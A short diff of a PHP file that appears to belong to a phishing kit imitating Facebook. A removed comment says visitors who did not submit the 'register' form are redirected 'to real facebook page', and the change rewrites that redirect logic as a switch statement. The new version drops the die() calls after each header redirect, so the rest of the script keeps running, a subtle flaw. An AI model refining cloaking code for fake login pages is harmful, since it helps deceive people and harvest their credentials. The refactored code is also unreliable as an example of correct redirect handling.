@@ -7,22 +7,15 @@ require("$fullpath/config.inc.php");
 
 // Check if register form is NOT submitted
 if($_POST['submit'] != "true"){
-	// If register form is not submitted redirect to real facebook page
-	if($config_option__287 == "true"){
-		header("Location: https://facebook.com/");
-		// Die() the page loading
-		die();
-	}elseif($config_option__287 == "false"){
-		// Die() the page loading
-		die();
-	}elseif($config_option__287 == "home"){
-		header("Location: /index.php");
-		// Die() the page loading
-		die();
-	}else{
-		header('Location: $config_option__287');
-		// Die() the page loading
-		die();
+	switch($config_option__287){
+		case "facebook":
+			header("Location: https://facebook.com");
+			break;
+		case "home":
+			header("Location: /index.php");
+			break;
+		default:
+			header("Location: $config_option__287");
 	}
 }
 
